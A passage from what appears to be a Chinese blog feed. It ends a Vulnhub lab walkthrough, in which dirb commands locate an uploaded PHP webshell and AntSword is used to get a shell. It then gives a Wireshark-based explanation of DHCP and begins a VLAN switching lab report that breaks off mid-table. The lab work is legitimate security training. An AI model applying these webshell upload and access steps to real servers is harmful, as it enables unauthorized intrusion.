class="code"><pre><span class="line">​dirb http://192.168.16.132/admin/uploads - w</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/a9353e6c9bec445aa15e9619294a5da9.png"></p><h4 id="（2）通过后缀名-Php来验证文件保存位置"><a href="#（2）通过后缀名-Php来验证文件保存位置" class="headerlink" title="（2）通过后缀名.Php来验证文件保存位置"></a>（2）通过后缀名.Php来验证文件保存位置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​dirb http://192.168.16.132/admin/uploads - w -X .Php</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/349f1c7cd20349f2940704569226158f.png"></p><p>从扫描结果中，我们成功找到了我们上传的文件 “abc.Php”。并且发现其访问路径为<a href="http://192.168.16.132/admin/uploads/webshell.Php" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;admin&#x2F;uploads&#x2F;abc.Php">http://192.168.16.132/admin/uploads/abc.Php</a>。</p><h3 id="6-访问上传文件并获取-Shell"><a href="#6-访问上传文件并获取-Shell" class="headerlink" title="6.访问上传文件并获取 Shell"></a>6.访问上传文件并获取 Shell</h3><p> <img src="https://i-blog.csdnimg.cn/direct/9c0176b263054c4f9630e6bde7c346b6.png"></p><p>在浏览器中访问<a href="http://192.168.16.132/admin/uploads/webshell.Php" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;admin&#x2F;uploads&#x2F;abc.Php">http://192.168.16.132/admin/uploads/abc.Php</a>，如果一切顺利，我们的一句话木马将被执行，此时我们可以使用工具（如中国蚁剑或其他类似的 WebShell 管理工具）连接到这个地址，通过在工具中输入密码（这里是 “cmd”，与我们在一句话木马中设置的密码一致），成功连接后，我们就获取了靶机的 Shell 权限，可以在靶机上执行各种命令，进一步深入探索靶机系统，完成渗透测试的目标。</p><hr>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
            <tag> Sqlmap </tag>
            
            <tag> nmap </tag>
            
            <tag> from_sqli_to_shell_i386 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark抓包分析理解DHCP协议及工作流程</title>
      <link href="/posts/55b4.html"/>
      <url>/posts/55b4.html</url>
      
        <content type="html"><![CDATA[<h1>    一、DHCP简介</h1><p>    <span style="font-size: 16px;">        &emsp;&emsp;        <strong>            DHCP（Dynamic Host Configuration Protocol）        </strong>        动态主机配置协议，前身是BOOTP协议。在大型局域网中，需要给很多主机配置地址信息，如果采用传统手工配置（累死），效率太低，因    </span>    <span style="font-size: 16px;">        此采用此协议可以很方便的给主机配置各种地址信息，例如IP地址，SubMask、网关地址、DNS等等。    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;下面进行简单介绍，下面所述中        <strong>            Client值得就是DHCP Client，Server指的是DHCP Server        </strong>        。    </span></p><hr /><h2>    (1)DHCP协议理解</h2><ul>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    定义：                </strong>            </span>            DHCP：Dynamic Host Configuration Protocol，动态主机配置协议，是一个应用在局域网中的网络协议，它使用UDP协议工作。        </span>    </li>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    理解：                </strong>            </span>            DHCP协议就是一个基于UDP协议工作在局域网内的网络协议，其最终的目的就是获取响应的IP地址，其中这过程中有多种分配方式，以及发送报文的格式要求等。        </span>    </li>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    作用：                </strong>            </span>            动态分配IP地址，过程自动化，终端无需一一手工配置，配置信息统一管理（DNS,网关），IP地址有限、需要大量配置IP地址、经常移动终端。        </span>    </li>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    好处：                </strong>            </span>            提高配置IP地址效率，减少配置工作量，减少IP地址冲突。        </span>    </li>    <li>        <span style="color: #e03e2d;">            <strong>                <span style="font-size: 16px;">                    分配IP地址方式：                </span>            </strong>        </span>        <ul>            <li>                <span style="font-size: 16px;">                    <strong>                        （1）手工配置方式：                    </strong>                    通过网络管理员手工配置某台客户端特定的IP地址，当客户端请求分配时，DHCP服务器就将手动配置的IP地址分配给客户端。。                </span>            </li>            <li>                <span style="font-size: 16px;">                    <strong>                        （2）自动配置方式：                    </strong>                    当DHCP客户端第一次想服务端租用到第一个IP地址后，就将这个IP地址永久分配给客户端使用。                </span>            </li>            <li>                <span style="font-size: 16px;">                    <strong>                        （3）动态配置方式：                    </strong>                    服务器暂时分配一个IP地址给客户端，根据租约到期或者续约租期的方式来管理分配的IP地址。                </span>            </li>        </ul>    </li></ul><hr /><h2>    (2)DHCP报文格式</h2><h3>    2.1 DHCP报文封装格式</h3><table style="border-collapse: collapse; width: 27.7725%; border-color: #7e8c8d; border-style: solid;"border="1" cellspacing="0">    <tbody>        <tr>            <td style="text-align: center; width: 99.9142%;" colspan="4">                <strong>                    DHCP报文封装格式                </strong>            </td>        </tr>        <tr>            <td style="text-align: center; width: 22.1459%;">                <p>                    <strong>                        链路层头                    </strong>                </p>            </td>            <td style="text-align: center; width: 34.5064%;">                <p>                    <strong>                        IP头&nbsp; 20bytes                    </strong>                </p>            </td>            <td style="text-align: center; width: 17.2532%;">                <p>                    <strong>                        UDP头                    </strong>                </p>            </td>            <td style="text-align: center; width: 26.0086%;">                <p>                    <strong>                        DHCP报文                    </strong>                </p>            </td>        </tr>    </tbody></table><hr /><h3>    2.2 DHCP报文格式</h3><p>    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240626083301811-829038666.png"    height="396" width="705" style="display: block; margin-left: auto; margin-right: auto;"    /></p><ul>    <li>        <span style="font-size: 16px;">            <strong>                op：            </strong>            1byte,是报文的操作类型，分为请求报文和响应报文，1为请求报文；2为响应报文。具体的报文类型在option字段中标识。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                htype：            </strong>            1byte,表示client硬件地址的类型，1表示以太网类型。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                hlen：            </strong>            1byte，硬件地址的长度，以太网的硬件地址长度为6bytes。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                hops：            </strong>            1byte，表示当前dhcp报文经过的DHCP中继的数目，每经过一个DHCP中继这个字段就加1.        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                xid：            </strong>            4bytes，由client端产生的随机数，用于匹配请求和应答报文，就是匹配应答报文是对哪个请求报文做出应答。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                secs：            </strong>            2bytes，客户端进入IP地址申请进程的时间或者更新IP地址进程的时间；由客户端软件根据情况设定。目前没有使用，固定为0。        </span>    </li>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    flags：                </strong>            </span>            2bytes，是标志字段，16比特中只使用了最高位比特（即最左边的比特），            <span style="color: #e03e2d;">                <strong>                    这个个比特是广播响应标识位，用来标识DHCP服务器发出的响应报文是广播还是单播，0是单播，1是广播                </strong>            </span>            。其余的比特位保留不用，都为0。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                ciaddr：            </strong>            4bytes，是客户端的IP地址，可以是client自己的IP地址，也可以是server分配给client的IP地址。        </span>    </li>    <li>        <span style="font-size: 16px; color: #e03e2d;">            <strong>                yiaddr(Your IP Address)：            </strong>            4bytes，是            <strong>                server分配给client的IP地址            </strong>            。        </span>    </li>    <li>        <span style="font-size: 16px; color: #e03e2d;">            <strong>                siaddr：            </strong>            4bytes，是client端获取IP地址等信息的            <strong>                server端的地址            </strong>            。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                giaddr：            </strong>            4bytes，是client发出请求报文后经过的第一个中继的IP地址。        </span>    </li>    <li>        <span style="font-size: 16px; color: #e03e2d;">            <strong>                chaddr：            </strong>            16bytes，是            <strong>                client端的硬件地址            </strong>            ，在client发出报文时会把自己            <strong>                网卡的硬件地址            </strong>            写进这个字段。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                sname：            </strong>            64bytes，服务器主机名，是client端获取IP地址等信息的服务器名称。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                file：            </strong>            128bytes，是client的启动配置文件名，是服务器为client指定的启动配置文件名及路径信息，由服务器填写。        </span>    </li>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    options                </strong>                ：            </span>            是可选变长的选项字段，这个字段包含了            <span style="color: #e03e2d;">                <strong>                    终端的初始配置信息和网络配置信息，包括报文类型，有效租期，DNS服务器的IP地址等配置信息                </strong>            </span>            。        </span>    </li></ul><p>    &nbsp;</p><p>    <span style="font-size: 16px;">        &emsp;&emsp;Options字段有很多项，是可选的，不同的报文option项可能不同。    </span></p><p style="text-align: center;">    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240626084809766-1692041272.png"    height="209" width="551" /></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;不同的option项有不同的含义，下面是一些常见的option项：    </span></p><ul>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    DHCP Message Type：                </strong>            </span>            表示DHCP的报文类型。        </span>    </li>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    Client identifier:&nbsp;                </strong>            </span>            &nbsp;client端的硬件地址        </span>    </li>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    Server identifier:                </strong>                &nbsp;            </span>            服务器的IP地址        </span>    </li>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    Subnet Mask:&nbsp;                </strong>            </span>            子网掩码        </span>    </li>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    route:&nbsp;                </strong>            </span>            网关IP地址        </span>    </li>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    Domain Name Server:                </strong>            </span>            DNS服务器的IP地址        </span>    </li>    <li>        <span style="font-size: 16px;">            <span style="color: #e03e2d;">                <strong>                    IP Address Lease Time:                </strong>            </span>            租约时间        </span>    </li></ul><hr /><h2>    (3)DHCP报文的种类</h2><p>    <span style="font-size: 16px;">        &emsp;&emsp;Dhcp协议一共有8种报文，包括：        <strong>            DHCP Dsicover        </strong>        ，        <strong>            DHCP Offer        </strong>        ，        <strong>            DHCP Request        </strong>        ，        <strong>            DHCP ACK        </strong>        ，        <strong>            DHCP NAK        </strong>        ，        <strong>            DHCP Release        </strong>        ，        <strong>            DHCP Decline        </strong>        ，        <strong>            DHCP Inform        </strong>        。    </span></p><p style="text-align: center;">    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240626082426661-1141126169.png"    height="448" width="701" /></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;报文类型由options字段中的        <strong>            option53&ldquo;DHCP Message Type&rdquo;        </strong>        选项来确定。各报文的具体含义如下：    </span></p><p>    <span style="font-size: 16px;">        <strong>            1.DHCP Dsicover        </strong>        报文：0x01 &nbsp;客户端请求包    </span></p><p>    <span style="font-size: 16px;">        这个报文是client端开始dhcp过程的第一个请求报文，client在请求地址时，并不知道server端的位置，所以client会以广播的方式发送请求报文，它的目的是发现网络中的服务器。    </span></p><h3>    <span style="font-size: 16px;">        <strong>            2.DHCP Offer        </strong>        报文： 0x02 &nbsp;服务器响应包    </span></h3><p>    <span style="font-size: 16px;">        &emsp;&emsp;这个报文server端对DISCOVERY报文的响应报文。会在所配置的地址池中查找一个合适的IP地址，加上相应的租约期限和其他配置信息（如GATEWAY，DNS        SERVER等），构造一个OFFER报文，发送给用户，告知用户本SERVER可以为其提供IP地址的分配，并且。发OFFER报文一般是单播的方式发送。    </span></p><h3>    <span style="font-size: 16px;">        3.        <strong>            DHCP Request        </strong>        报文：0x03 客户端选择包    </span></h3><p>    <span style="font-size: 16px;">        &emsp;&emsp;在一个子网中可能有多台服务器，所有收到DISCOVER报文的服务器都会回应OFFER报文，所以client端可能收到多个OFFER报文，通常会选择第一个OFFER报文的服务器作为自己的目标服务器，并回应一个REQUEST请求报文。在续租约的时候client端也会发送REQUEST报文        &nbsp;请求续租期。    </span></p><h3>    <span style="font-size: 16px;">        4.        <strong>            DHCP ACK        </strong>        报文：0x05 &nbsp;服务器确认包    </span></h3><p>    <span style="font-size: 16px;">        &emsp;&emsp;是server对client端的REQUEST报文的确认响应报文，server在收到REQUEST报文后，根据REQUEST报文中携带的client        MAC来查找有没有相应的租约记录，如果有则发送ACK报文作为回应，通知client可以使用分配的IP地址。    </span></p><h3>    <span style="font-size: 16px;">        5.        <strong>            DHCP NAK        </strong>        报文：0x06 &nbsp;服务器拒绝包    </span></h3><p>    <span style="font-size: 16px;">        &emsp;&emsp;Server端对client端的REQUEST报文的拒绝响应报文，如果服务器没有相应的租约记录，就会发送NAK报文给client端。    </span></p><h3>    <span style="font-size: 16px;">        6.        <strong>            DHCP Release        </strong>        报文：0x07 &nbsp;客户端释放包    </span></h3><p>    <span style="font-size: 16px;">        &emsp;&emsp;Client端主动释放server端分配给它的IP是，就会发送DHCP-RELEASE报文给server，server收到这个报文后，就会回收这个IP地址。    </span></p><h3>    <span style="font-size: 16px;">        7.        <strong>            DHCP Decline        </strong>        ：0x04    </span></h3><p>    <span style="font-size: 16px;">        &emsp;&emsp;client收到server回应的ACK报文后，通过地址冲突检测发现 SERVER分配的地址冲突或由于其它原因导致不能使用，则发送DHCP-DECLINE报文，通知server所分配的IP地址不可用。    </span></p><h3>    <span style="font-size: 16px;">        8.        <strong>            DHCP Inform        </strong>        报文：0x08    </span></h3><p>    <span style="font-size: 16px;">        &emsp;&emsp;在client已经获得了IP地址，需要从server端获得更详细的配置信息时，就会发送DHCP-INFORM报文向server请求，server在收到这个报文后，会根据租约查找，找到相应的配置信息后，就会回应DHCP-ACK报文给client。    </span></p><hr /><h2>    (4)DHCP工作过程</h2><ol>    <li>        <span style="font-size: 16px;">            客户端通过            <span style="color: #e03e2d;">                <strong>                    广播                </strong>            </span>            发送            <strong>                DHCP Discover            </strong>            报文            <span style="color: #e03e2d;">                <strong>                    <span style="text-decoration: underline;">                        寻找DHCP服务端                    </span>                </strong>            </span>            。        </span>    </li>    <li>        <span style="font-size: 16px;">            服务端通过            <span style="color: #e03e2d;">                <strong>                    单播                </strong>            </span>            发送            <strong>                DHCP Offer            </strong>            报文向客户端            <span style="text-decoration: underline; color: #e03e2d;">                <strong>                    提供从地址池中挑选的可用IP等网络信息                </strong>            </span>            。        </span>    </li>    <li>        <span style="font-size: 16px;">            客户端            <span style="color: #e03e2d;">                <strong>                    只接收第一个收到的DHCP Offer报文                </strong>            </span>            并            <span style="text-decoration: underline;">                <span style="color: #e03e2d; text-decoration: underline;">                    <strong>                        提取IP地址                    </strong>                </span>            </span>            ，然后向通过            <span style="color: #e03e2d;">                <strong>                    广播                </strong>            </span>            发送            <strong>                DHCP Request            </strong>            报文告知            <span style="text-decoration: underline;">                <span style="color: #e03e2d; text-decoration: underline;">                    <strong>                        服务端要使用该IP地址                    </strong>                </span>            </span>            。        </span>    </li>    <li>        <span style="font-size: 16px;">            服务端通过            <span style="color: #e03e2d;">                <strong>                    单播                </strong>            </span>            发送            <strong>                DHCP ACK            </strong>            报文告知客户端            <span style="text-decoration: underline;">                <span style="color: #e03e2d; text-decoration: underline;">                    <strong>                        该IP地址是合法可用的，并提供租约信息                    </strong>                </span>            </span>            。        </span>    </li></ol><p style="text-align: center;">    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240626095948173-1489540212.png"    height="313" width="432" />    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240626091113912-207253523.png"    height="331" width="403" /></p><p style="text-align: center;">    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240626090621635-1056664789.png"    /></p><p>    &nbsp;</p><hr /><h1>    二、DHCP动态获取IP地址</h1><p>    <span style="font-size: 16px;">        &emsp;&emsp;DHCP动态获取IP地址的过程主要分为        <strong>            发现Discover阶段        </strong>        、        <strong>            提供Offer阶段        </strong>        、        <strong>            选择Request阶段        </strong>        、        <strong>            确认ACK阶段        </strong>        四个阶段。    </span></p><hr /><p>    <img src="https://pic.rmb.bdstatic.com/bjh/240625/383b1ad12029826203fb60a3a0c9988f8524.jpeg"    /></p><h2>    (1)    <strong>        发现Discover阶段：    </strong></h2><p>    <span style="font-size: 16px;">        &emsp;&emsp;client端在局域网内以广播的方式发起一个        <span style="color: #e03e2d;">            <strong>                DHCP Discover广播报文            </strong>        </span>        ，目的是在子网络中发现能够给client端提供IP地址的server端。    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;特别要注意到的是，        <span style="text-decoration: underline;">            PC会随机出一个Transaction ID，如果之后收到的Offer报文中的Transaction ID与PC模拟出的不同，PC会将该Offer报文直接丢弃        </span>        。    </span></p><blockquote>    <p>        <span style="font-size: 16px;">            &emsp;&emsp;UDP 目标端口号为67&nbsp;&nbsp;&nbsp;&nbsp;源IP地址：0.0.0.0&nbsp;&nbsp;            &nbsp;目的IP地址：255.255.255.255        </span>    </p></blockquote><p style="text-align: center;">    <span style="font-size: 16px;">        <img src="https://pic.rmb.bdstatic.com/bjh/240625/2af2ff4d089208213c793cdee4601a492893.jpeg"        />    </span></p><hr /><h2>    (2)    <strong>        提供Offer阶段：    </strong></h2><p>    <span style="font-size: 16px;">        &emsp;&emsp;局域网中DHCP server接受到Discover包之后，通过发送        <span style="color: #e03e2d;">            <strong>                DHCP offer            </strong>        </span>        包给client端应答，主要是        <span style="color: #e03e2d;">            <strong>                告知client端可以提供IP地址，以及相应的IP地址租约信息和其他配置信息            </strong>        </span>        也会在其中。    </span></p><blockquote>    <p>        <span style="font-size: 16px;">            &emsp;&emsp;UDP 目标端口号为68&nbsp; &nbsp; 源IP地址：172.22.192.1&nbsp; &nbsp;            目的IP地址：172.22.194.142        </span>    </p></blockquote><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240626/1e9b99baade846ff7adf6664f3f7b4502091.jpeg"    /></p><blockquote>    <p>        <span style="font-size: 16px;">            &emsp;&emsp;DHCP Offer报文中&ldquo;            <strong>                Your(Client) IP Address            </strong>            &rdquo;字段就是            <strong>                DHCP Server能够提供给DHCP Client使用的IP地址            </strong>            ，且DHCP Server会将自己的IP地址放在&ldquo;option&rdquo;字段中            <strong>                以便            </strong>            <strong>                DHCP Client            </strong>            <strong>                区分不同的            </strong>            <strong>                DHCP Server            </strong>            。        </span>    </p></blockquote><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240626/67ed2b59165024abcec484804a89d13b1333.jpeg"    /></p><hr /><h2>    (3)选择Request阶段：</h2><p>    <span style="font-size: 16px;">        &emsp;&emsp;在client端可能会接受到多个offer包，通常clientdaunt        <strong>            只会接受收到的第一个DHCP offer报文        </strong>        ，然后client端就会以        <strong>            广播的方式发送一个DHCP request报文请求分配IP地址        </strong>        。    </span></p><blockquote>    <p>        <span style="font-size: 16px;">            &emsp;&emsp;UDP 目标67 &nbsp; &nbsp;源IP为0.0.0.0 &nbsp; 目的IP:255.255.255.255        </span>    </p></blockquote><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240626/6be0cef8dd138bed0cf40a7e3e25b71e5974.jpeg"    /></p><blockquote>    <p>        <span style="font-size: 16px;">            &emsp;&emsp;DHCP Client只能处理其中的一个DHCP Offer报文，一般的原则是DHCP Client处理            <strong>                最先收到的            </strong>            <strong>                DHCP Offer            </strong>            <strong>                报文            </strong>            。DHCP Client会发出一个广播的DHCP            <strong>                &nbsp;Request            </strong>            报文，在            <strong>                选项字段中会加入选中的            </strong>            <strong>                DHCP Server            </strong>            <strong>                的            </strong>            <strong>                IP            </strong>            <strong>                地址和需要的            </strong>            <strong>                IP            </strong>            <strong>                地址            </strong>            。        </span>    </p></blockquote><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240626/718a2638b6cdafa1d34270d9f7d204242624.jpeg"    /></p><hr /><h2>    (4)确认ACK阶段：</h2><p>    <span style="font-size: 16px;">        &emsp;&emsp;server端在收到DHCP request报文之后，        <strong>            会判断&rdquo;option&rdquo;字段的serverIP地址是否是自己的IP地址        </strong>        ，如果        <span style="text-decoration: underline;">            <strong>                符合分配IP地址的条件，就会给client发送一个DHCP ACK包            </strong>        </span>        ，如果        <span style="text-decoration: underline;">            <strong>                不满足就发挥发送一个DHCP NAK 包            </strong>        </span>        。    </span></p><blockquote>    <p>        <span style="font-size: 16px;">            &emsp;&emsp;DHCP Server收到DHCP Request报文后，            <strong>                判断选项字段中的            </strong>            <strong>                IP            </strong>            <strong>                地址是否与自己的地址相同            </strong>            。            <strong>                <u>                    如果不相同，                </u>            </strong>            <strong>                <u>                    DHCP Server                </u>            </strong>            <strong>                <u>                    不做任何处理只清除相应                </u>            </strong>            <strong>                <u>                    IP                </u>            </strong>            <strong>                <u>                    地址分配记录                </u>            </strong>            ；如果相同，DHCP Server就会向DHCP Client响应一个DHCP ACK报文，并在选项字段中增加IP地址的使用租期信息。        </span>    </p></blockquote><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240626/a5bc7d7483be508c11ca08850920dd4e5637.jpeg"    /></p><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240626/5864b6ce2a39d1b54e3c2031aa150b671871.jpeg"    /></p><hr /><h2>    (5)DHCP Release</h2><blockquote>    <p>        <span style="font-size: 16px;">            &nbsp;&emsp;&emsp;DHCP Client在成功获取IP地址后，            <strong>                随时可以通过发送DHCP Release报文释放自己的IP地址            </strong>            ，DHCP Server收到DHCP Release报文后，            <strong>                会回收相应的            </strong>            <strong>                IP地址并重新分配            </strong>            。        </span>    </p></blockquote><p>    <span style="font-size: 16px;">        &emsp;&emsp;图中的5个报文，其中        <strong>            DHCP Release        </strong>        报文为PC释放IP时发出的报文。    </span></p><p>    <span style="font-size: 16px;">        <img src="https://pic.rmb.bdstatic.com/bjh/240625/4e5ba75c42e3fb9b71b755488c07b3a1350.jpeg"        />    </span></p><hr /><p>    &nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wireshark抓包 </tag>
            
            <tag> DHCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络实验一 交换网络组建</title>
      <link href="/posts/87b.html"/>
      <url>/posts/87b.html</url>
      
        <content type="html"><![CDATA[<hr /><h1>    实验报告册模板及实验pkt文件下载：</h1><p>    <span style="font-size: 16px;">        <a href="https://workupload.com/file/TF9CU3aFjwQ">            <strong>                2024实验报告纸-计算机网络-交换网络组建.doc            </strong>        </a>    </span></p><table>    <tbody>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    Filename:&nbsp;                </span>            </td>            <td style="text-align: center;">                <span style="font-size: 16px;">                    2024实验报告纸-计算机网络-交换网络组建.doc                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    Filesize:&nbsp;                </span>            </td>            <td style="text-align: center;">                <span style="font-size: 16px;">                    49664 (Byte)                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    Checksum:&nbsp;                </span>            </td>            <td style="text-align: center;">                <span style="font-size: 16px;">                    c5d83ff9675922bdc5d18ce32f57146888514df621c9b79d306b55ad54c1f8c7 (SHA256)                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    QR-URL:&nbsp;                </span>            </td>            <td style="text-align: center;">                <span style="font-size: 16px;">                    <img src="https://workupload.com/qr/file/TF9CU3aFjwQ" />                </span>            </td>        </tr>    </tbody></table><hr /><p>    <strong>        <span style="font-size: 16px;">            <a href="https://workupload.com/file/XdaBbMSkW44" target="_blank" rel="noopener">                利用三层交换机实现不同vlan的主机间互联互通.pkt            </a>        </span>    </strong></p><table>    <tbody>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    Filename:&nbsp;                </span>            </td>            <td style="text-align: center;">                <span style="font-size: 16px;">                    利用三层交换机实现不同vlan的主机间互联互通.pkt                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    Filesize:&nbsp;                </span>            </td>            <td style="text-align: center;">                <span style="font-size: 16px;">                    9348 (Byte)                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    Checksum:&nbsp;                </span>            </td>            <td style="text-align: center;">                <span style="font-size: 16px;">                    ac1fe7ed03efc234ff41c64ee54d46804770e7aa309b3afc6d092ffbcb82aacb (SHA256)                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    QR-URL:&nbsp;                </span>            </td>            <td style="text-align: center;">                <span style="font-size: 16px;">                    <img src="https://workupload.com/qr/file/XdaBbMSkW44" />                </span>            </td>        </tr>    </tbody></table><hr /><h1>    一、实验内容</h1><p>    <span style="font-size: 16px;">        <strong>            1.        </strong>        常用网络命令的应用 &emsp;&emsp;    </span></p><p>    <span style="font-size: 16px;">        <strong>            2.        </strong>        交换机基本配置 &emsp;&emsp;    </span></p><p>    <span style="font-size: 16px;">        <strong>            3.        </strong>        虚拟局域网VLAN基本设置 &emsp;&emsp;    </span></p><p>    <span style="font-size: 16px;">        <strong>            4.        </strong>        利用三层交换机实现不同VLAN间通信    </span></p><hr /><h1>    二、实验目的和要求</h1><p>    <span style="font-size: 16px;">        <strong>            1.        </strong>        通过了解网络实验台的软硬件环境及命令行界面，掌握网络配置和查看配置信息的方法。 &emsp;&emsp;    </span></p><p>    <span style="font-size: 16px;">        <strong>            2.        </strong>        通过熟悉常用的网络命令，掌握网络测试方法。 &emsp;&emsp;    </span></p><p>    <span style="font-size: 16px;">        <strong>            3.        </strong>        通过配置交换机端口隔离，理解虚拟局域网VLAN的原理，掌握Port Vlan的配置方法。 &emsp;&emsp;    </span></p><p>    <span style="font-size: 16px;">        <strong>            4.        </strong>        通过配置三层交换机的路由功能，实行VLAN间互相通信。    </span></p><hr /><h1>    三、实验设备（软、硬件）</h1><ul>    <li>        <span style="font-size: 16px;">            二层交换机        </span>    </li>    <li>        <span style="font-size: 16px;">            三层交换机        </span>    </li>    <li>        <span style="font-size: 16px;">            PC机        </span>    </li>    <li>        <span style="font-size: 16px;">            Packet Tracer仿真软件        </span>    </li></ul><hr /><h1>    四、实验设计方案（或实验综合知识）</h1><p>    <span style="font-size: 16px;">        &emsp;&emsp;案例：某市某单位在办公楼内组建局域网，使各业务部门的计算机能够互连互通，为避免广播风暴，同时也是出于为不同的业务部门划分不同的VLAN，请根据以上需求，组建交换局域网。    </span></p><p>    <strong>        &emsp;&emsp;1. 组网需求分析    </strong>    &emsp;&emsp;</p><p>    <strong>        &emsp;&emsp;2. 组网方案设计    </strong>    &emsp;&emsp;</p><p>    <strong>        &emsp;&emsp;3. VLan及IP地址规划    </strong></p><table style="border-collapse: collapse; width: 43.8363%; border-style: solid; height: 280px;">    <thead>        <tr style="height: 49px;">            <th style="width: 9.94565%; height: 49px; text-align: center;">                主机名            </th>            <th style="width: 12.0652%; text-align: center; height: 49px;">                <p>                    交换机名                </p>            </th>            <th style="width: 7.66304%; text-align: center; height: 49px;">                <p>                    端口                </p>            </th>            <th style="width: 9.61956%; text-align: center; height: 49px;">                Vlan            </th>            <th style="width: 18.0978%; text-align: center; height: 49px;">                IP地址            </th>            <th style="width: 21.3587%; text-align: center; height: 49px;">                子网掩码            </th>            <th style="width: 21.1957%; text-align: center; height: 49px;">                网关地址            </th>        </tr>    </thead>    <tbody>        <tr style="height: 21px;">            <td style="width: 9.94565%; text-align: center; height: 21px;">                主机0            </td>            <td style="width: 12.0652%; text-align: center; height: 21px;">                S2126-2            </td>            <td style="width: 7.66304%; text-align: center; height: 21px;">                F0/1            </td>            <td style="width: 9.61956%; text-align: center; height: 21px;">                10            </td>            <td style="width: 18.0978%; text-align: center; height: 21px;">                192.168.10.1            </td>            <td style="width: 21.3587%; text-align: center; height: 21px;">                255.255.255.0            </td>            <td style="width: 21.1957%; text-align: center; height: 21px;">                192.168.10.254            </td>        </tr>        <tr style="height: 21px;">            <td style="width: 9.94565%; text-align: center; height: 21px;">                主机1            </td>            <td style="width: 12.0652%; text-align: center; height: 21px;">                S2126-2            </td>            <td style="width: 7.66304%; text-align: center; height: 21px;">                F0/2            </td>            <td style="width: 9.61956%; text-align: center; height: 21px;">                10            </td>            <td style="width: 18.0978%; text-align: center; height: 21px;">                192.168.10.2            </td>            <td style="width: 21.3587%; text-align: center; height: 21px;">                255.255.255.0            </td>            <td style="width: 21.1957%; text-align: center; height: 21px;">                192.168.10.254            </td>        </tr>        <tr style="height: 21px;">            <td style="width: 9.94565%; text-align: center; height: 21px;">                主机2            </td>            <td style="width: 12.0652%; text-align: center; height: 21px;">                S2126-2            </td>            <td style="width: 7.66304%; text-align: center; height: 21px;">                F0/3            </td>            <td style="width: 9.61956%; text-align: center; height: 21px;">                20            </td>            <td style="width: 18.0978%; text-align: center; height: 21px;">                192.168.20.1            </td>            <td style="width: 21.3587%; text-align: center; height: 21px;">                255.255.255.0            </td>            <td style="width: 21.1957%; text-align: center; height: 21px;">                192.168.20.254            </td>        </tr>        <tr style="height: 21px;">            <td style="width: 9.94565%; text-align: center; height: 21px;">                主机3            </td>            <td style="width: 12.0652%; text-align: center; height: 21px;">                S2126-1            </td>            <td style="width: 7.66304%; text-align: center; height: 21px;">                F0/1            </td>            <td style="width: 9.61956%; text-align: center; height: 21px;">                20            </td>            <td style="width: 18.0978%; text-align: center; height: 21px;">                192.168.20.2            </td>            <td style="width: 21.3587%; text-align: center; height: 21px;">                255.255.255.0            </td>            <td style="width: 21.1957%; text-align: 